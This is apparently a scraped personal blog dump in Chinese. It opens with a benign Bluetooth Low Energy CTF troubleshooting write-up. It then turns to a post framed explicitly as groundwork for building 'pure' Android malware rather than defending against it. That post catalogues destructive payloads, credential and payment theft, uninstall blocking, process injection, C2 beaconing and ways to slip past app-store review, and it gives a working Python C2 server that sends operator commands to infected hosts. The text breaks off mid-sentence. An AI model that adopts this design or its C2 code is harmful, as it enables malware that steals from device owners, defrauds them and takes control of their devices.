0x00007fff...Flash will be erased from 0x00008000 to 0x00008fff...Flash will be erased from 0x00010000 to 0x000cafff...SHA digest in image updated.Wrote 26464 bytes (16501 compressed) at 0x00001000 in 0.7 seconds (299.5 kbit/s).Hash of data verified.Wrote 3072 bytes (103 compressed) at 0x00008000 in 0.0 seconds (538.0 kbit/s).Hash of data verified.Wrote 765904 bytes (452895 compressed) at 0x00010000 in 11.0 seconds (559.3 kbit/s).Hash of data verified.Hard resetting via RTS pin...                                                                                             ┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]└─$ \n\n\n\n\n\n\n\nConnection refused (111)──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;connect to 64:B7:08:61:B9:7E: Connection refused (111)┌──(kali㉿kali)-[~/Desktop]└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;connect to 64:B7:08:61:B9:7E: Connection refused (111)\n\n先是排查功能\nsudo hciconfig hci0 lestatessudo hcitool lescan\n均正常输出\n使用bluetooth进行交互\n#检查 bluetoothd 状态sudo systemctl status bluetooth#启动它sudo systemctl start bluetooth  #重启它sudo systemctl restart bluetooth#运行它sudo bluetoothctl\n尝试进行交互\n└─$ sudo bluetoothctl                                       [bluetooth]# Agent registered[bluetooth]# connect 64:B7:08:61:B9:7EDevice 64:B7:08:61:B9:7E not available[bluetooth]# scan on[bluetooth]# SetDiscoveryFilter success[bluetooth]# Failed to start discovery: org.bluez.Error.InProgress\n在旁边另开一个终端，使用btmon进行底层HCI的查看得到的部分日志\n@ MGMT Event: Command Complete (0x0001) plen 263  &#123;0x0001&#125; [hci0] 461.113935      Set Local Name (0x000f) plen 260        Status: Success (0x00)        Name: kali        Short name: bluetoothctl[24851]: @ MGMT..pen (privileged) version 1.23   &#123;0x0002&#125; 522.145845bluetoothctl[24851]: @ MGMT Close: bluetoothctl          &#123;0x0002&#125; 839.044348                                                   @ MGMT Event: Connect Failed (0x000d) plen 8      &#123;0x0001&#125; [hci0] 850.944326                                                           LE Address: 64:B7:08:61:B9:7E (Espressif Inc.)                                                                                 Status: Disconnected (0x0e)                                                                                            @ MGMT Event: Connect Failed (0x000d) plen 8      &#123;0x0001&#125; [hci0] 897.298500                                                           LE Address: 64:B7:08:61:B9:7E (Espressif Inc.)                                                                                 Status: Disconnected (0x0e)                                                                                            bluetoothctl[27969]: @ MGMT..pen (privileged) version 1.23   &#123;0x0002&#125; 901.948847                                               scanbluetoothd[24308]: @ MGMT Comm..d (0x0023) plen 1  &#123;0x0001&#125; [hci0] 919.350036                                                      Address type: 0x07                                                                                                               BR/EDR                                                                                                                         LE Public                                                                                                                      LE Random@ MGMT Event: Command Complete (0x0001) plen 4    &#123;0x0001&#125; [hci0] 919.350060      Start Discovery (0x0023) plen 1        Status: Busy (0x0a)        Address type: 0x07          BR/EDR          LE Public          LE Random\n\n给出的解决措施是重启蓝牙服务\nsudo systemctl stop bluetooth  # Stop the service firstsleep 2                     # Give it a second to shut downsudo systemctl start bluetooth # Start it freshsudo systemctl status bluetooth # Verify it&#x27;s active (running)\n还有蓝牙适配器\nsudo hciconfig hci0 downsudo hciconfig hci0 up\n一顿重启后终于成功了\n└─$ sudo bluetoothctl[bluetooth]# Agent registered[bluetooth]# scan on[bluetooth]# SetDiscoveryFilter success[bluetooth]# hci0 type 7 discovering on[bluetooth]# Discovery started[bluetooth]# [CHG] Controller 84:E0:F4:03:0F:5E Discovering: yes[bluetooth]# [NEW] Device 64:B7:08:61:B9:7E BLECTF\nOperation not possible due to RF-kill (132)报错\n┌──(kali㉿kali)-[~/Desktop]└─$ sudo hciconfig hci0 up  Can&#x27;t init device hci0: Operation not possible due to RF-kill (132)\n解决\n#检查蓝牙状况sudo rfkill list bluetooth#解除软件阻塞 (Soft blocked):如果显示 &quot;Soft blocked: yes&quot;sudo rfkill unblock bluetooth#解除所有类型的阻塞sudo rfkill unblock all\n处理硬件阻塞 (Hard blocked): 如果显示 “Hard blocked: yes”，这意味着有一个物理开关（通常在笔记本电脑的侧面、前面或通过 Fn 组合键）关闭了蓝牙。你需要找到这个开关并物理上打开它。软件命令 (rfkill unblock) 无法解除硬件阻塞。\n之后把蓝牙拔了又重新插回去就好了，重启大法妙呀（）\nDevice or resource busy (16)┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;connect to 64:B7:08:61:B9:7E: Device or resource busy (16)\n意味着你的蓝牙适配器 (hci0) 已经被另一个应用程序或进程打开并独占使用了可能是没有完全退出的bluetoothctl或者gatttool服务进行排查\n┌──(kali㉿kali)-[~/Desktop]└─$ ps aux | grep bluetoothctlkali      202460  0.0  0.1   6520  2184 pts/0    S+   07:20   0:00 grep --color=auto bluetoothctl┌──(kali㉿kali)-[~/Desktop]└─$ ps aux | grep gatttoolkali      202840  0.0  0.1   6520  2336 pts/0    S+   07:21   0:00 grep --color=auto gatttool\n除了 grep 进程本身，没有其他名为 bluetoothctl &#x2F;gatttool的进程在运行。所以依然是重启\nsudo systemctl restart bluetooth\n适配器也可以重启\nsudo hciconfig hci0 downsudo hciconfig hci0 up# 检查状态，确保是 UP RUNNINGhciconfig hci0\n\n\n\n\n\nDevice 64:B7:08:61:B9:7E not available当一切都没有问题只有bluetoothctl有问题时，尝试scan on然后再scan off(记得关掉，因为前台没有显示但是用btmon看后台时它是一直在扫描的)，然后再连接就可以了,因为这强制更新了 bluetoothd 的设备状态缓存。\n┌──(kali㉿kali)-[~/Desktop]└─$ sudo bluetoothctl              [bluetooth]# Agent registered[bluetooth]# connect 64:B7:08:61:B9:7EDevice 64:B7:08:61:B9:7E not available[bluetooth]# [bluetooth]# exit                                                                                                ┌──(kali㉿kali)-[~/Desktop]└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\\n&#x27;Write the ascii value &quot;yo&quot; he                                                                                                ┌──(kali㉿kali)-[~/Desktop]└─$ sudo bluetoothctl[bluetooth]# Agent registered[bluetooth]# connect 64:B7:08:61:B9:7EDevice 64:B7:08:61:B9:7E not available[bluetooth]# scan on[bluetooth]# SetDiscoveryFilter success[bluetooth]# hci0 type 7 discovering on[bluetooth]# Discovery started[bluetooth]# [CHG] Controller 84:E0:F4:03:0F:5E Discovering: yes[bluetooth]# [NEW] Device 64:B7:08:61:B9:7E BLECTF[bluetooth]# [NEW] Device 54:61:CC:20:CD:5B 54-61-CC-20-CD-5B[bluetooth]# scan off[NEW] Device 50:81:5C:20:B9:E0 50-81-5C-20-B9-E0[bluetooth]# scan off[bluetooth]# hci0 type 7 discovering off[bluetooth]# Discovery stopped[bluetooth]# [CHG] Device 50:81:5C:20:B9:E0 TxPower is nil[bluetooth]# [CHG] Device 50:81:5C:20:B9:E0 RSSI is nil[bluetooth]# [CHG] Device 54:61:CC:20:CD:5B TxPower is nil[bluetooth]# [CHG] Device 54:61:CC:20:CD:5B RSSI is nil[bluetooth]# [CHG] Device 64:B7:08:61:B9:7E TxPower is nil[bluetooth]# [CHG] Device 64:B7:08:61:B9:7E RSSI is nil[bluetooth]# [CHG] Controller 84:E0:F4:03:0F:5E Discovering: no[bluetooth]# connect 64:B7:08:61:B9:7EAttempting to connect to 64:B7:08:61:B9:7E[bluetooth]# hci0 64:B7:08:61:B9:7E type LE Public connected eir_len 18[BLECTF]# [CHG] Device 64:B7:08:61:B9:7E Connected: yes[BLECTF]# Connection successful\n\n\n\n\n\nFailed to start discovery: org.bluez.Error.InProgress尝试连接时的显示\n┌──(kali㉿kali)-[~/Desktop]└─$ sudo bluetoothctl[bluetooth]# Agent registered[bluetooth]# connect 64:B7:08:61:B9:7EDevice 64:B7:08:61:B9:7E not available[bluetooth]# scan on[bluetooth]# SetDiscoveryFilter success[bluetooth]# Failed to start discovery: org.bluez.Error.InProgress[bluetooth]# \n对应的btmon日志\nbluetoothctl[12451]: @ MGMT Open: bluetoothctl (privileged) version 1.23                                 &#123;0x0002&#125; 753.015752bluetoothd[8979]: @ MGMT Command: Start Discovery (0x0023) plen 1                                 &#123;0x0001&#125; [hci0] 775.725210        Address type: 0x07          BR/EDR          LE Public          LE Random@ MGMT Event: Command Complete (0x0001) plen 4                                                    &#123;0x0001&#125; [hci0] 775.725234      Start Discovery (0x0023) plen 1        Status: Busy (0x0a)        Address type: 0x07          BR/EDR          LE Public          LE Random\n\nbluetoothd[8979]: @ MGMT Command: Start Discovery (0x0023) …: bluetoothd 确实通过管理接口向 hci0 发送了“启动发现”的命令。\n\n@ MGMT Event: Command Complete (0x0001) … Start Discovery (0x0023) … Status: Busy (0x0a): 这是关键。 蓝牙适配器 (hci0) 通过管理接口回复说，启动发现命令失败，因为适配器当前状态是 **Busy (忙碌，状态码 0x0a)**。\n\n\n措施依然是重启\n参考资料靶场：https://github.com/hackgnar/ble_ctf蓝牙知识扩展：https://www.bluetooth.com/https://github.com/Eronwu/Getting-Started-with-Bluetooth-Low-Energy-in-Chinesehttps://github.com/pauloborges/bluez/blob/master/attrib/gatttool.chttps://community.nxp.com/t5/Wireless-Connectivity-Knowledge/Indication-and-Notification/ta-p/1129270https://blog.csdn.net/qq_36347513/article/details/118762746\n"},{"title":"恶意软件开发前置","url":"/2025/01/04/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%911/","content":"前提目的是做一个恶意软件，实现基本恶意功能，当前版本专注于实现基本功能，只有基本界面和功能。那么一个恶意软件应当具有什么功能呢，下面主要研究的是怎么做，而不是防御和绕过检测。它将是一个纯粹的恶意软件。以下信息pc和安卓都有，只是将基于Android端开发。。。\n安卓平台的特殊性\n\n基于 Linux 内核： Android 系统基于 Linux 内核，这意味着一些 Linux 系统上的 Rootkit 技术也可以应用于 Android。\n\n分层架构： Android 系统采用分层架构，包括内核层、硬件抽象层 (HAL)、原生层、系统层和应用层。这使得恶意软件可以攻击不同的层级。\n\n权限管理： Android 有严格的权限管理机制，应用程序必须请求权限才能访问受保护的资源。\n\n启动过程： Android 的启动过程包括 Bootloader、Kernel、Init 进程、Zygote 进程和 System Server 等关键步骤。\n\n安全机制： Android 有多种安全机制，例如，SELinux、安全启动、应用签名、代码扫描等。\n\n\n恶意功能破坏性\n数据损坏和篡改：\n\n文件覆盖、数据加密，恶意修改数据\n\n\n无法正常使用业务：\n\nddos\n无限弹窗\n锁屏功能\n\n\n系统崩溃：\n\n占用CPU、内存资源、制造错误等。破坏Android的Binder机制、破坏Android的SELinux策略\n\n\n无法初始化系统：\n\n利用漏洞修改系统文件，防止用户进入恢复模式，强制重启设备，以及加密手机存储等方式。\n\n\n破坏恢复机制：\n\n删除备份、修改恢复设置\n\n\n\n恶意操作（非预期，不被希望的操作）\n恶意下载：\n\n路过式下载，静默下载，强制安装，捆绑安装,绕过安全防护进行下载，Android环境下绕过应用商店的检测\n\n\n在后台自启动运行：\n\n恶意软件通常在用户不知情的情况下运行，消耗设备资源，降低设备性能。利用设备进行挖矿操作。 在Android系统中，可以使用 AlarmManager 实现定时任务，或者使用 WorkManager 来执行一些后台任务。\n\n\n阻止用户卸载： \n\n恶意软件会采取一些手段，阻止用户卸载该应用程序。从权限层面进行限制，例如阻止卸载界面显示，设置需要密码才能卸载。使用 DeviceAdmin 权限、修改系统设置、伪造卸载界面等\n\n\n窃取信息：\n\n利用漏洞非法读取信息，例如浏览器历史记录， Cookie， 账号密码，文件信息。利用社会工程学骗取信息\n\n\n发送短信或拨打电话： \n\n恶意软件可能在后台发送短信（可能包含诈骗链接）或拨打收费电话，给用户造成经济损失。\n\n\n获取Root权限： \n\n如果恶意软件获取了Root权限，它可以进行更深入的系统控制，例如安装系统级别的恶意代码。\n\n\n修改系统设置： \n\n修改系统设置，禁用安全功能，或更改网络设置，使其更容易进行其他恶意活动。修改注册表、操作底层文件系统。禁用安全更新、修改DNS设置、更改网络代理\n\n\n\n代码操作\n进程注入进程注入是指将恶意代码注入 explorer.exe 或 svchost.exe 等合法进程。这有助于通过在受信任的进程中执行来隐藏恶意软件的恶意意图。 可以使用 CreateRemoteThread、WriteProcessMemory 等 API 来实现代码注入。\n\n进程空心进程挖空是恶意软件在暂停合法进程、用恶意代码替换其代码并使用恶意代码恢复执行时使用的一种技术。这使得恶意软件看起来像是一个合法进程。可以使用 CreateProcess 和 NtUnmapViewOfSection 等 API 来实现进程空心\n\n\n后门后门可以分为本地后门和远程后门。本地后门可以利用系统漏洞，远程后门可以利用网络通信。隐藏后门: 修改系统日志，隐藏监听端口，进行数据加密等等。隐藏其存在并允许攻击者远程控制计算机的恶意软件。通常隐藏在操作系统底层，难以检测和清除。常用于维护对受感染系统的持久访问。可以考虑使用Android的BroadcastReceiver，Service等组件来建立后门。\n命令与控制c2许多恶意软件使用一种称为 c2（命令和控制）的东西。这是许多恶意软件的关键组件，尤其是在 APT（高级持续性威胁）、僵尸网络和其他形式的远程访问恶意软件中。此 c2 充当中心点，攻击者可以在此控制受感染机器上的恶意软件并与之通信。此基础设施允许攻击者远程向恶意软件发出命令并协调恶意软件将采取的活动。\nc2 通常做什么？\n\n感染和回调\n\n一旦恶意软件感染了主机，它就会回调到 c2 以建立连接，并让攻击者知道系统已被入侵。这也称为beaconing。\n\n通常，恶意软件会嵌入 IP 地址（恶意软件中也可能包含加密配置）、域或 URL，作为 c2 的联系点。在复杂的攻击中，恶意软件可能会使用 DGA（域生成算法）来创建随机域，从而使阻止或跟踪 c2 通信变得更加困难。\n\n\n\n持久性\n\n恶意软件将与 c2 保持持续连接，以发送数据、接收命令或发送定期“ping”以让 c2 知道它仍然活跃。它甚至可能是所有这些的混合。\n\n\n命令执行\n\nc2 还用于远程向恶意软件发送命令。这些命令可能包括：\n\n额外的有效载荷下载。\n\n从系统中窃取数据。\n\n接收并执行系统上的命令。\n\n从受感染的系统向其他目标发起攻击。\n\n\n\n\n\n数据泄露\n\n恶意软件 c2 服务器通常用于从受感染的系统中窃取数据。\n\n键盘记录器可能会使用 c2 来保存记录的键盘。\n\n勒索软件可能会使用 c2 窃取数据，以便随后对被勒索的公司进行敲诈勒索。\n\n窃取者使用 c2 窃取受损凭证和银行信息。\n\n\n\n\n\n更新\n\n有时（这种情况很少见）恶意软件可能会使用 c2 更新自身，增加新功能。在一些复杂的攻击中，恶意软件是模块化的，这允许攻击者根据攻击阶段从 c2 动态加载“插件”或模块到恶意软件中。\n\n\n混淆&#x2F;逃避\n\nc2 通常会设置加密通信通道，以使窥探者更难确定 c2 通信正在做什么。\n\n\n重定向和代理\n\nFast flux 是某些恶意软件用来频繁更改关联域名 IP 地址的技术。它可以解析大量 IP 地址，这些 IP 地址可充当实际 c2 基础设施的临时代理。\n\nc2 服务器可能使用反向代理（也称为跳转箱），这可能是一个充当原始服务器中继的受感染系统。\n\n\n\n\n可能的 C2 协议\n\nHTTP（s）\n\n通常用于隐藏与正常网络流量相关的流量。恶意软件将向 c2 发送 GET&#x2F;POST 请求。\n\n\nDNS 隧道\n\n一些恶意软件会在 DNS 查询中编码命令或数据。由于 DNS 流量通常不受密切监控，因此这种情况可能不会被注意到。\n\n\n自定义协议\n\n一些更复杂的恶意软件家族会创建专有协议来隐藏其 c2 连接。\n\n值得注意的是，这很难实现，如果您不知道自己在做什么，就不应该尝试。\n\n\n\n\nP2P（点对点）\n\n僵尸网络使用 P2P 通信。每个受感染的系统都可以在需要时充当 C2，这使得摧毁 C2 基础设施变得更加困难。\n\n\nC2 架构： C2 可以使用多种架构，例如：集中式架构、分布式架构、点对点架构等。\n\nC2 隐藏： C2 通常会使用多种技术来隐藏其踪迹，例如，域名生成算法（DGA）、Fast flux、加密通信等。\n\nC2 检测： 安全人员会使用多种技术来检测 C2 通信，例如，网络流量分析、域名信誉分析、行为分析等。\n\nC2 反制： 安全人员会采取多种手段来反制 C2，例如，阻断 C2 通信、追踪 C2 服务器、清除受感染设备等。\n\n\n基本 c2 示例\n正如您所读到的，c2 被设计为恶意软件的“通信中心”，用于接收命令并决定下一步要做什么。下面是一个用 Python 编写的 c2 的基本示例：\n复制\nimport socketdef c2_server():    # listen on all interfaces    host = &#x27;0.0.0.0&#x27;    port = 4444        # setup the socket    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server_socket.bind((host, port))    # limit total connections to 5    server_socket.listen(5)     print(f&quot;[+] Listening for incoming connections on &#123;host&#125;:&#123;port&#125;...&quot;)    client_socket, addr = server_socket.accept()        # loop forever    while True:        command = input(&quot;Enter command to execute: &quot;)        # send the command         client_socket.send(command.encode())        if command.lower() == &#x27;exit&#x27;:            print(&quot;[-] Closing connection.&quot;)            client_socket.close()            break                # return the results from the malware        result = client_socket.recv(1024).decode()        print(f&quot;Output:\\n&#123;result&#125;&quot;)if __name__ == &quot;__main__&quot;:    c2_server()\n\n\n\n隐藏自身不出现桌面图标，伪装成系统进程，将代码注入到合法进程\n支付劫持劫持用户的支付信息，进行盗刷\n激活方式特定用户触发：特定时间，特定地区，特定时间事件：充电，接入wifi水平仪、加速度传感器，陀螺仪\n权限要完成以上恶意操作，都需要“权限”，那就不能直接运行直接调用权限吗？不能，那样会无法启动\n\n[!NOTE] 权限Android 权限系统提供的控件可提高用户对应用权限的认知，还可以限制应用对敏感数据的访问。在 Android 8.0 及更低版本中，权限配置包括将应用列入许可名单。特权应用如果未列入许可名单，即使位于 priv-app 路径中，也一样会被停用。在 Android 9 及更高版本上，如果设备尝试使用未正确列入许可名单的应用，则系统将无法启动。\n\n\n权限的定义： 在移动操作系统中，权限是应用程序访问受保护资源（例如：摄像头、麦克风、位置信息、联系人等）的许可。为了保护用户的隐私和安全，应用程序必须在获得用户明确同意的情况下才能使用这些资源。\n\n权限的分类（以Android为例）：\n\n普通权限（Normal Permissions）： 这些权限不会直接影响用户的隐私，例如：访问网络、保持屏幕唤醒等。应用程序可以直接声明这些权限，而无需用户授权。\n\n危险权限（Dangerous Permissions）： 这些权限可能会影响用户的隐私或安全，例如：访问联系人、读取短信、获取地理位置等。应用程序必须在运行时向用户请求这些权限。\n\n特殊权限（Special Permissions）： 这些权限涉及更敏感的操作，例如：修改系统设置、在其他应用之上显示内容等。应用程序必须在运行时请求这些权限，并且用户必须明确授权。\n\n\n\n运行时权限请求（Runtime Permissions）： 为了提高用户体验和安全性，Android引入了运行时权限请求。应用程序必须在运行时向用户请求危险权限，用户可以根据自己的意愿授予或拒绝这些权限。\n\n\n所以获取“权限”需要特殊手段\n获取权限大致分为利用漏洞强制获取，和将权限设置放入恶意软件直接获取\n利用漏洞：\n\n操作系统漏洞： 操作系统中可能存在一些安全漏洞，恶意软件可以利用这些漏洞直接获取权限，而无需用户授权。Android的漏洞利用技术， 例如：利用栈溢出、堆溢出、Use-After-Free 等漏洞。\n\n应用漏洞： 某些应用程序可能存在安全漏洞，恶意软件可以利用这些漏洞来获取其他应用程序的权限。\n\n\n权限绕过：\n\n覆盖攻击（Overlay Attack）： 恶意软件可以创建一个假的权限请求界面，覆盖在真实的权限请求界面之上。当用户点击“允许”时，实际上是将权限授予了恶意软件。\n\n点击劫持（Clickjacking）： 恶意软件可以将真实的权限请求界面隐藏在一个不可见的透明层之下，当用户点击透明层时，实际上是点击了真实的权限请求界面。\n\n权限滥用： 恶意软件可以利用用户已经授予的权限，来进行其他恶意操作。 例如，一个获取了网络权限的恶意程序，可以下载其他恶意软件，或者将用户的隐私数据上传到服务器。\n\n隐蔽授权： 利用用户在安装应用时的习惯，在用户不知情的情况下诱导用户点击，从而获得权限。\n\n辅助功能服务(Accessibility Service):利用 Accessibility Service 来获取用户屏幕信息、模拟用户操作、进行权限提升。无障碍服务只能用于帮助残障用户使用 Android 设备和应用程序。它们在后台运行，并在触发 [AccessibilityEvent](https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent) s 时接收系统的回调。此类事件表示用户界面中的某些状态转换，例如，焦点已更改、单击了按钮等。此类服务可以选择请求查询活动窗口内容的功能。开发无障碍服务需要扩展此类并实现其抽象方法。\n\n\n权限提升：\n\nRoot权限： 恶意软件可以尝试获取设备的Root权限。一旦获取Root权限，它就可以绕过所有的权限检查，从而访问任何受保护的资源。\n\n系统权限： 一些特殊的系统应用程序可能拥有更高的权限，恶意软件可以尝试利用这些权限来获取其他应用程序的权限。\n\nAndroid的Accessibility Service来进行权限提升。\n\n\n社会工程学：\n\n欺骗： 恶意软件可以伪装成一个无害的应用程序，诱骗用户授予其不必要的权限。\n\n诱导： 恶意软件可以通过各种方式，例如：提供免费服务、奖励，来诱导用户授予权限。\n\n模仿： 恶意软件可以伪装成系统界面，让用户误以为自己在操作系统界面，从而点击授予权限。\n\n\n其他手段：\n\n预装恶意软件： 恶意软件可以被预装在设备中，这种情况下，用户可能根本无法察觉。\n\n供应链攻击： 恶意软件可以通过供应链的方式传播，例如：攻击软件开发商或应用商店。恶意软件伪装成正常软件在应用商店里，吸引别人下载，它既可以直接获取所要的信息（比如步数app获取步数信息），也可以间接的获取权限（比如将确定按钮放在透明层之下）\n\n\nroot权限只有普通权限是不够的：\n\n权限限制： 普通权限只能访问有限的系统资源和API，无法进行深层次的恶意操作。\n\n安全沙箱： 普通应用程序运行在安全沙箱中，无法访问其他应用程序或系统资源，这限制了恶意软件的攻击能力。\n\n用户授权： 普通应用程序需要用户明确授权才能访问敏感权限，这使得恶意软件难以在用户不知情的情况下获取敏感信息。\n\n无法持久化： 普通应用程序无法在系统启动时自动启动，也无法在用户卸载后仍然运行。\n\n无法进行底层操作： 普通应用程序无法进行底层的系统操作，例如修改内核、驱动、固件等。\n\n无法阻止卸载： 普通应用程序难以阻止用户卸载。\n\n\n所以通常需要获得更高的权限，root权限\n\n利用漏洞：\n\n内核漏洞： Android内核（基于Linux）中存在一些安全漏洞，恶意软件可以利用这些漏洞来直接获取root权限。 例如：利用脏牛漏洞，提权到root权限。\n\n驱动漏洞： 设备驱动程序中也可能存在漏洞，恶意软件可以利用这些漏洞来获取root权限。\n\n系统应用漏洞： 一些系统应用程序，例如：系统服务， 可能会存在漏洞，恶意软件可以利用这些漏洞来获取root权限。\n\nBootloader 漏洞： 恶意软件可能会利用Bootloader的漏洞，来获取root权限。\n\nRecovery模式漏洞： 恶意软件可以利用Recovery模式的漏洞， 来获取root权限。\n\nOTA更新漏洞： 恶意软件可以利用OTA更新的漏洞， 来获取root权限。\n\n\n\n利用Root工具：\n\nRoot工具： 一些Root工具（例如：Magisk、Kingroot、SuperSU）可以帮助用户获取root权限。 恶意软件可以利用这些Root工具，或者伪装成这些Root工具，来诱骗用户授予其root权限。\n\n预装Root工具： 恶意软件开发者可能会将恶意软件预装在Root工具中，当用户安装Root工具时，恶意软件也会被安装。\n\n劫持Root工具： 恶意软件可能会劫持用户安装的Root工具，从而获取Root权限。\n\n\n\n\n权限列表\n读取和修改任何文件： 恶意软件可以读取和修改系统中的任何文件，例如：修改配置文件、删除系统文件、注入恶意代码。\n\n安装系统级恶意软件： 恶意软件可以安装系统级的恶意软件，例如：后门、Rootkit，这些恶意软件难以被用户发现和清除。\n\n禁用安全防护： 恶意软件可以禁用系统自带的安全防护功能，例如：SELinux、安全启动、应用验证等，从而提升自身的攻击能力。\n\n隐藏自身： 恶意软件可以隐藏自身的进程，服务， 使得其难以被检测到。\n\n劫持系统服务： 恶意软件可以劫持系统服务，进行各种恶意操作，例如：拦截短信、窃取支付信息等。\n\n修改系统设置： 恶意软件可以修改系统的设置， 例如 修改DNS设置， 禁用安全更新等。\n\n劫持用户输入： 恶意软件可以劫持用户的输入，记录用户的键盘输入、触摸输入等，从而窃取敏感信息。\n\n远程控制： 获得root权限后，可以建立远程控制通道， 完全控制设备。\n\n提升持久化能力： 获得root权限后，可以修改系统启动文件，使得恶意软件在系统重启后仍然可以运行。\n\n防止卸载： 获得root权限后，可以阻止用户卸载恶意软件，例如删除卸载界面，修改系统文件等。\n\n窃取敏感数据： 恶意软件可以窃取用户的敏感数据，例如：联系人、短信、通话记录、位置信息、照片、视频、音频等。\n\n发起高级攻击： 可以利用root权限，进行各种高级攻击， 例如 DDoS攻击， 僵尸网络等。如下：\n\nREAD_CONTACTS (读取联系人)\n\nREAD_SMS &#x2F; RECEIVE_SMS (读取短信&#x2F;接收短信)\n\nREAD_CALL_LOG (读取通话记录)\n\nREAD_EXTERNAL_STORAGE (读取外部存储，如照片、视频、音频)\n\nACCESS_FINE_LOCATION &#x2F; ACCESS_COARSE_LOCATION (读取地理位置)\n\nREAD_CLIPBOARD (读取剪贴板)\n\nGET_TASKS (获取应用列表，这个权限在新版本被限制)\n\nINTERNET (访问网络，用于与远程服务器通信)\n\nWAKE_LOCK (保持设备唤醒，用于后台运行)\n\nINSTALL_PACKAGES (安装其他应用)\n\nSEND_SMS (发送短信)\n\nCALL_PHONE (拨打电话)\n\nCHANGE_WIFI_STATE (更改 Wi-Fi 状态)\n\nWRITE_SETTINGS (修改系统设置)\n\nPACKAGE_USAGE_STATS （访问应用使用统计，需要用户授权）\n\nACCESS_NETWORK_STATE (获取网络状态)\n\nWAKE_LOCK (保持设备唤醒，用于长时间执行任务)\n\nSYSTEM_ALERT_WINDOW (显示浮动窗口，用于显示广告)\n\nSYSTEM_ALERT_WINDOW (锁定屏幕)\n\n\n传播恶意软件本体电子邮件&#x2F;手机短信钓鱼邮件，伪装发件人。欺骗收件人使其点击邮件链接\nEKexploit kit路过式下载如此盛行是因为用于感染网站的攻击工具包很容易在黑市上买到，这种攻击包非常好用，并且是自动化的，让攻击者可以在尽可能多的服务器上散播恶意软件。EK是一种基于服务器的框架，它使用漏洞利用浏览器相关软件应用程序中的漏洞，在用户不知情的情况下感染客户端（Windows 台式机或笔记本电脑）大多数 EK 的作者使用软件即服务 （SaaS） 作为其业务模型。此模型有时也称为平台即服务 （PaaS）、恶意软件即服务 （MaaS） 或 EK 即服务 （EKaaS）。\n示例EK:\n\nAngler:https://www.malwarebytes.com/blog/threats/angler Angler 是网络犯罪分子用来分发恶意软件（从勒索软件和银行木马到广告欺诈）的领先漏洞利用工具包之一。与大多数其他漏洞利用工具包一样，它专注于浏览器及其插件中基于 Web 的漏洞。Angler 是当时为数不多的提供无文件感染的漏洞利用工具包之一，其中恶意软件从不接触磁盘，仅驻留在内存中以避免被发现。 Angler 自 2016 年 6 月以来一直处于不活跃状态。\n\nRIG EK:https://resources.prodaft.com/rig-exploit-kit-report RIG EK 是一项以经济为动机的计划，自 2014 年以来一直很活跃。尽管它尚未在最近的活动中实质性地改变其漏洞利用，但威胁行为者分发的恶意软件的类型和版本不断变化。更新样本的频率从每周更新到每天不等。\n\nTrojan dropper:https://www.malwarebytes.com/blog/threats/trojan-dropper 下载程序和植入程序是适用于各种类型恶意软件（如特洛伊木马和 Rootkit）的帮助程序。通常，它们以脚本（VB、批处理）或小型应用程序的形式实现。\n\n\n广告\n路过式下载欺诈：\n这些广告会在用户仅仅是查看广告时，就自动将恶意软件下载到用户的设备上，而无需用户点击。这是利用用户浏览器或操作系统的漏洞。\n\n\n重定向广告：\n这些广告会将用户重定向到不需要或恶意的网页。常见的目的地包括窃取个人信息的网络钓鱼网站、技术支持诈骗网站或恶意软件下载页面。\n\n\n欺骗性广告：\n需要擅长利用用户心理，引导用户点击，适用于一些必须交互才能进行的攻击\n\n\n恶意广告：\n指的是包含恶意代码的广告。它涉及将恶意代码注入合法的广告网络，使攻击者能够传播恶意软件或将用户重定向到恶意网站。\n\n\n广告注入：\n基于浏览器扩展的：恶意的浏览器扩展程序可以在用户不知情的情况下，将广告注入到网页中。这些广告可能具有欺骗性，将用户重定向到网络钓鱼网站，或下载恶意软件。\n基于路由器的：被攻破的路由器可以将广告注入到所有网络流量中，通常用户对此毫不知情。\n基于应用程序的 ： 一些移动应用程序，特别是来自非官方来源的应用程序，可以将不需要的广告注入到其他应用程序或操作系统本身中。\n\n\n\n应用商店直接上传在应用商店应用商店（例如：Google Play Store、Apple App Store）为了保护用户安全，会对上架的应用程序进行审核，以检测是否存在恶意行为。 然而，恶意软件开发者会使用各种技术手段，绕过这些检测，将恶意应用程序伪装成合法应用程序，上传到应用商店。\n\n代码混淆（Code Obfuscation）：\n\n原理： 将应用程序的代码进行混淆，使得代码难以阅读和理解。 这包括重命名变量、函数、类名，以及插入无意义的指令等。\n\n作用： 增加恶意代码分析的难度，使得应用商店的自动检测工具难以识别恶意行为。\n\n常用工具: ProGuard，DexGuard 等。\n\n\n\n动态加载（Dynamic Loading）：\n\n原理： 将恶意代码放在服务器上，应用程序在运行时从服务器下载并加载这些代码。\n\n作用： 避免将恶意代码直接包含在应用程序的安装包中，使得应用商店的静态分析工具难以检测到。\n\n实现： 使用 DexClassLoader，PathClassLoader 等机制进行动态加载。\n\n\n\n延时加载（Delayed Loading）：\n\n原理： 恶意代码不会在应用程序启动时立即执行，而是在经过一段时间后，或满足特定条件时才执行。\n\n作用： 避免在应用商店审核期间触发恶意行为，使得应用商店的审核人员难以察觉。\n\n实现： 使用 AlarmManager、WorkManager 等机制进行定时或延时执行。\n\n\n\n服务器控制（Server-Side Control）：\n\n原理： 恶意代码的行为受服务器的控制，服务器可以随时改变恶意代码的行为。\n\n作用： 